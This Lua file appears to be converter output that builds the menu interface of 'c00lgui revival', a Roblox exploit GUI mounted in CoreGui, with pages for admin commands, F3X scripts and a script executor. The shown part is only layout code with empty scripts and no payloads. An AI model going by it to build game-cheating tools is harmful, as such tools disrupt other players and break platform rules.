--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 393 | Scripts: 151 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.c00lguiSE
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[c00lguiSE]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.c00lguiSE.Main
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["Active"] = true;
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(48, 48, 48);
G2L["2"]["Selectable"] = true;
G2L["2"]["Size"] = UDim2.new(0, 404, 0, 250);
G2L["2"]["Position"] = UDim2.new(0.35392, 0, 0.27018, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Main]];


-- StarterGui.c00lguiSE.Main.MenuOpen
G2L["3"] = Instance.new("ImageButton", G2L["2"]);
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["ImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["3"]["Image"] = [[rbxassetid://98599917927083]];
G2L["3"]["Size"] = UDim2.new(0, 29, 0, 23);
G2L["3"]["BackgroundTransparency"] = 1;
G2L["3"]["Name"] = [[MenuOpen]];
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Position"] = UDim2.new(0.02133, 0, 0.03936, 0);


-- StarterGui.c00lguiSE.Main.MenuOpen.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["3"]);



-- StarterGui.c00lguiSE.Main.PageTitle
G2L["5"] = Instance.new("TextLabel", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 25;
G2L["5"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["RichText"] = true;
G2L["5"]["Size"] = UDim2.new(0, 325, 0, 30);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Home]];
G2L["5"]["Name"] = [[PageTitle]];
G2L["5"]["Position"] = UDim2.new(0.12624, 0, 0.024, 0);


-- StarterGui.c00lguiSE.Main.Minimize
G2L["6"] = Instance.new("TextButton", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["6"]["TextSize"] = 14;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["6"]["RichText"] = true;
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 20, 0, 21);
G2L["6"]["Name"] = [[Minimize]];
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[X]];
G2L["6"]["Position"] = UDim2.new(0.93069, 0, 0.028, 0);


-- StarterGui.c00lguiSE.Main.PageSelect
G2L["7"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["7"]["Visible"] = false;
G2L["7"]["Active"] = true;
G2L["7"]["ZIndex"] = 3;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["CanvasSize"] = UDim2.new(0, 0, 2.2, 0);
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(44, 44, 44);
G2L["7"]["Name"] = [[PageSelect]];
G2L["7"]["Size"] = UDim2.new(0, 0, 0, 250);
G2L["7"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.PageSelect.UIListLayout
G2L["8"] = Instance.new("UIListLayout", G2L["7"]);
G2L["8"]["Padding"] = UDim.new(0.02, 0);
G2L["8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.c00lguiSE.Main.PageSelect.minimized
G2L["9"] = Instance.new("BoolValue", G2L["7"]);
G2L["9"]["Name"] = [[minimized]];


-- StarterGui.c00lguiSE.Main.PageSelect.Title
G2L["a"] = Instance.new("TextLabel", G2L["7"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["Active"] = true;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 15;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a"]["RichText"] = true;
G2L["a"]["Size"] = UDim2.new(0, 129, 0, 22);
G2L["a"]["BorderColor3"] = Color3.fromRGB(168, 32, 0);
G2L["a"]["Text"] = [[c00lgui revival]];
G2L["a"]["Name"] = [[Title]];


-- StarterGui.c00lguiSE.Main.PageSelect.Title.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.c00lguiSE.Main.PageSelect.Home
G2L["c"] = Instance.new("TextButton", G2L["7"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextSize"] = 12;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["c"]["RichText"] = true;
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["c"]["Name"] = [[Home]];
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Text"] = [[Home]];
G2L["c"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Home.ButtonScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);
G2L["d"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Admin Commands/GUIs
G2L["e"] = Instance.new("TextButton", G2L["7"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["TextSize"] = 12;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["e"]["RichText"] = true;
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["e"]["Name"] = [[Admin Commands/GUIs]];
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[Admin Commands/GUIs]];
G2L["e"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Admin Commands/GUIs.ButtonScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);
G2L["f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Players
G2L["10"] = Instance.new("TextButton", G2L["7"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextSize"] = 12;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["10"]["RichText"] = true;
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["10"]["Name"] = [[Players]];
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Players]];
G2L["10"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Players.ButtonScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);
G2L["11"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.LocalPlayer
G2L["12"] = Instance.new("TextButton", G2L["7"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["TextSize"] = 12;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["12"]["RichText"] = true;
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["12"]["Name"] = [[LocalPlayer]];
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[LocalPlayer]];
G2L["12"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.LocalPlayer.ButtonScript
G2L["13"] = Instance.new("LocalScript", G2L["12"]);
G2L["13"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Scripts
G2L["14"] = Instance.new("TextButton", G2L["7"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["TextSize"] = 12;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["14"]["RichText"] = true;
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["14"]["Name"] = [[Scripts]];
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Scripts]];
G2L["14"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Scripts.ButtonScript
G2L["15"] = Instance.new("LocalScript", G2L["14"]);
G2L["15"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.F3X Scripts
G2L["16"] = Instance.new("TextButton", G2L["7"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["TextSize"] = 12;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["16"]["RichText"] = true;
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["16"]["Name"] = [[F3X Scripts]];
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[F3X Scripts]];
G2L["16"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.F3X Scripts.ButtonScript
G2L["17"] = Instance.new("LocalScript", G2L["16"]);
G2L["17"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Music
G2L["18"] = Instance.new("TextButton", G2L["7"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["TextSize"] = 12;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["18"]["RichText"] = true;
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["18"]["Name"] = [[Music]];
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Music]];
G2L["18"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Music.ButtonScript
G2L["19"] = Instance.new("LocalScript", G2L["18"]);
G2L["19"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Gears
G2L["1a"] = Instance.new("TextButton", G2L["7"]);
G2L["1a"]["TextWrapped"] = true;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["TextSize"] = 12;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["1a"]["RichText"] = true;
G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1a"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["1a"]["Name"] = [[Gears]];
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Text"] = [[Gears]];
G2L["1a"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Gears.ButtonScript
G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
G2L["1b"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Executor
G2L["1c"] = Instance.new("TextButton", G2L["7"]);
G2L["1c"]["TextWrapped"] = true;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["TextSize"] = 12;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["1c"]["RichText"] = true;
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["1c"]["Name"] = [[Executor]];
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[Executor]];
G2L["1c"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Executor.ButtonScript
G2L["1d"] = Instance.new("LocalScript", G2L["1c"]);
G2L["1d"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Misc.
G2L["1e"] = Instance.new("TextButton", G2L["7"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["TextSize"] = 12;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["1e"]["RichText"] = true;
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["1e"]["Name"] = [[Misc.]];
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Misc.]];
G2L["1e"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Misc..ButtonScript
G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);
G2L["1f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Settings
G2L["20"] = Instance.new("TextButton", G2L["7"]);
G2L["20"]["TextWrapped"] = true;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["TextSize"] = 12;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["20"]["RichText"] = true;
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["20"]["Name"] = [[Settings]];
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Settings]];
G2L["20"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Settings.ButtonScript
G2L["21"] = Instance.new("LocalScript", G2L["20"]);
G2L["21"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.PageSelect.Credits
G2L["22"] = Instance.new("TextButton", G2L["7"]);
G2L["22"]["TextWrapped"] = true;
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["TextSize"] = 12;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
G2L["22"]["RichText"] = true;
G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22"]["Size"] = UDim2.new(0, 129, 0, 29);
G2L["22"]["Name"] = [[Credits]];
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Credits]];
G2L["22"]["Position"] = UDim2.new(0, 0, 0.064, 0);


-- StarterGui.c00lguiSE.Main.PageSelect.Credits.ButtonScript
G2L["23"] = Instance.new("LocalScript", G2L["22"]);
G2L["23"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.minimized
G2L["24"] = Instance.new("BoolValue", G2L["2"]);
G2L["24"]["Name"] = [[minimized]];
G2L["24"]["Value"] = true;


-- StarterGui.c00lguiSE.Main.Pages
G2L["25"] = Instance.new("Folder", G2L["2"]);
G2L["25"]["Name"] = [[Pages]];


-- StarterGui.c00lguiSE.Main.Pages.Home
G2L["26"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["26"]["Active"] = true;
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["26"]["ScrollingEnabled"] = false;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["26"]["Name"] = [[Home]];
G2L["26"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["26"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["26"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent
G2L["27"] = Instance.new("ImageLabel", G2L["26"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Image"] = [[rbxassetid://0]];
G2L["27"]["Size"] = UDim2.new(0, 60, 0, 60);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["BackgroundTransparency"] = 0.3;
G2L["27"]["Name"] = [[UserContent]];
G2L["27"]["Position"] = UDim2.new(0.02062, 0, 0.0175, 0);


-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["27"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.UICorner
G2L["29"] = Instance.new("UICorner", G2L["27"]);
G2L["29"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.WelcomeText
G2L["2a"] = Instance.new("TextLabel", G2L["27"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 20;
G2L["2a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["Size"] = UDim2.new(0, 178, 0, 32);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[Hello, {name}!]];
G2L["2a"]["Name"] = [[WelcomeText]];
G2L["2a"]["Position"] = UDim2.new(0, 72, 0, 14);


-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.WelcomeText.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo
G2L["2c"] = Instance.new("ScrollingFrame", G2L["26"]);
G2L["2c"]["Active"] = true;
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["CanvasSize"] = UDim2.new(0, 0, 0.5, 0);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["2c"]["Name"] = [[HomeInfo]];
G2L["2c"]["Size"] = UDim2.new(0, 388, 0, 129);
G2L["2c"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["2c"]["Position"] = UDim2.new(-0.00082, 0, 0.355, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.UIListLayout
G2L["2d"] = Instance.new("UIListLayout", G2L["2c"]);
G2L["2d"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["2d"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["2d"]["Wraps"] = true;
G2L["2d"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["2d"]["Padding"] = UDim.new(0.01, 0);
G2L["2d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2d"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.GameID
G2L["2e"] = Instance.new("TextLabel", G2L["2c"]);
G2L["2e"]["TextWrapped"] = true;
G2L["2e"]["BorderSizePixel"] = 2;
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["2e"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["2e"]["Name"] = [[GameID]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.GameID.LocalScript
G2L["2f"] = Instance.new("LocalScript", G2L["2e"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.PlayerCount
G2L["30"] = Instance.new("TextLabel", G2L["2c"]);
G2L["30"]["TextWrapped"] = true;
G2L["30"]["BorderSizePixel"] = 2;
G2L["30"]["TextSize"] = 14;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["30"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["30"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["30"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["30"]["Name"] = [[PlayerCount]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.PlayerCount.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["30"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RFECheck
G2L["32"] = Instance.new("TextLabel", G2L["2c"]);
G2L["32"]["TextWrapped"] = true;
G2L["32"]["BorderSizePixel"] = 2;
G2L["32"]["TextSize"] = 14;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["32"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["32"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["32"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["32"]["Name"] = [[RFECheck]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RFECheck.LocalScript
G2L["33"] = Instance.new("LocalScript", G2L["32"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.ServerTime
G2L["34"] = Instance.new("TextLabel", G2L["2c"]);
G2L["34"]["TextWrapped"] = true;
G2L["34"]["BorderSizePixel"] = 2;
G2L["34"]["TextSize"] = 14;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["34"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["34"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["34"]["Name"] = [[ServerTime]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.ServerTime.LocalScript
G2L["35"] = Instance.new("LocalScript", G2L["34"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RigType
G2L["36"] = Instance.new("TextLabel", G2L["2c"]);
G2L["36"]["TextWrapped"] = true;
G2L["36"]["BorderSizePixel"] = 2;
G2L["36"]["TextSize"] = 14;
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["36"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["36"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["36"]["Name"] = [[RigType]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RigType.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.FPS
G2L["38"] = Instance.new("TextLabel", G2L["2c"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["BorderSizePixel"] = 2;
G2L["38"]["TextSize"] = 14;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["38"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["38"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["38"]["Name"] = [[FPS]];


-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.FPS.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["38"]);



-- StarterGui.c00lguiSE.Main.Pages.Players
G2L["3a"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["3a"]["Visible"] = false;
G2L["3a"]["Active"] = true;
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["3a"]["ScrollingEnabled"] = false;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["3a"]["Name"] = [[Players]];
G2L["3a"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["3a"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["3a"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands
G2L["3b"] = Instance.new("ScrollingFrame", G2L["3a"]);
G2L["3b"]["Active"] = true;
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["3b"]["Name"] = [[PlayerCommands]];
G2L["3b"]["Size"] = UDim2.new(0, 388, 0, 139);
G2L["3b"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["3b"]["Position"] = UDim2.new(-0.00082, 0, 0.3025, 0);
